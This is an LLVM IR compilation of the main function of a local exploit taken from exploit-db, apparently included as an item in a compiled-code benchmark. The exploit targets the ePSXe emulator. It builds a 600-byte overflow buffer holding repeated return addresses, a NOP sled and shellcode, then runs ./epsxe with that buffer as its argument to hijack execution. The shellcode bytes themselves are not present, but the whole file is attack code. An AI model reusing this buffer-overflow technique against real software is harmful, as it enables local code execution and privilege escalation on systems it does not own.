; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1029.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1029.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [42 x i8] c"\0A ************************************* \0A\00", align 1
@.str.1 = private unnamed_addr constant [42 x i8] c"      ePSXe v1.* local exploit          \0A\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"                 by                  \0A\00", align 1
@.str.3 = private unnamed_addr constant [39 x i8] c"   Qnix  | Q-nix[at]hotmail[dot]com   \00", align 1
@.str.4 = private unnamed_addr constant [43 x i8] c"\0A ************************************* \0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"[~] Stack pointer (ESP) : 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"[~] Offset from ESP     : 0x%x\0A\00", align 1
@.str.7 = private unnamed_addr constant [33 x i8] c"[~] Desired Return Addr : 0x%x\0A\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@.str.8 = private unnamed_addr constant [8 x i8] c"./epsxe\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"epsxe\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"-nogui\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %13 = call i64 (...) @sp()
  store i64 %13, i64* %8, align 8
  %14 = load i64, i64* %8, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = sub nsw i64 %14, %16
  store i64 %17, i64* %9, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.4, i64 0, i64 0))
  %23 = load i64, i64* %8, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0), i64 %23)
  %25 = load i32, i32* %7, align 4
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0), i32 %25)
  %27 = load i64, i64* %9, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.7, i64 0, i64 0), i64 %27)
  %29 = call i8* @malloc(i32 600)
  store i8* %29, i8** %11, align 8
  %30 = load i8*, i8** %11, align 8
  store i8* %30, i8** %12, align 8
  %31 = load i8*, i8** %12, align 8
  %32 = bitcast i8* %31 to i64*
  store i64* %32, i64** %10, align 8
  store i32 0, i32* %6, align 4
  br label %33

33:                                               ; preds = %40, %2
  %34 = load i32, i32* %6, align 4
  %35 = icmp slt i32 %34, 600
  br i1 %35, label %36, label %43

36:                                               ; preds = %33
  %37 = load i64, i64* %9, align 8
  %38 = load i64*, i64** %10, align 8
  %39 = getelementptr inbounds i64, i64* %38, i32 1
  store i64* %39, i64** %10, align 8
  store i64 %37, i64* %38, align 8
  br label %40

40:                                               ; preds = %36
  %41 = load i32, i32* %6, align 4
  %42 = add nsw i32 %41, 4
  store i32 %42, i32* %6, align 4
  br label %33

43:                                               ; preds = %33
  store i32 0, i32* %6, align 4
  br label %44

44:                                               ; preds = %52, %43
  %45 = load i32, i32* %6, align 4
  %46 = icmp slt i32 %45, 200
  br i1 %46, label %47, label %55

47:                                               ; preds = %44
  %48 = load i8*, i8** %11, align 8
  %49 = load i32, i32* %6, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  store i8 -112, i8* %51, align 1
  br label %52

52:                                               ; preds = %47
  %53 = load i32, i32* %6, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %6, align 4
  br label %44

55:                                               ; preds = %44
  %56 = load i8*, i8** %11, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 200
  store i8* %57, i8** %12, align 8
  store i32 0, i32* %6, align 4
  br label %58

58:                                               ; preds = %72, %55
  %59 = load i32, i32* %6, align 4
  %60 = load i32*, i32** @shellcode, align 8
  %61 = call i32 @strlen(i32* %60)
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %75

63:                                               ; preds = %58
  %64 = load i32*, i32** @shellcode, align 8
  %65 = load i32, i32* %6, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i32, i32* %64, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = trunc i32 %68 to i8
  %70 = load i8*, i8** %12, align 8
  %71 = getelementptr inbounds i8, i8* %70, i32 1
  store i8* %71, i8** %12, align 8
  store i8 %69, i8* %70, align 1
  br label %72

72:                                               ; preds = %63
  %73 = load i32, i32* %6, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %6, align 4
  br label %58

75:                                               ; preds = %58
  %76 = load i8*, i8** %11, align 8
  %77 = getelementptr inbounds i8, i8* %76, i64 599
  store i8 0, i8* %77, align 1
  %78 = load i8*, i8** %11, align 8
  %79 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0), i8* %78, i32 0)
  %80 = load i8*, i8** %11, align 8
  %81 = call i32 @free(i8* %80)
  ret i32 0
}

declare dso_local i64 @sp(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
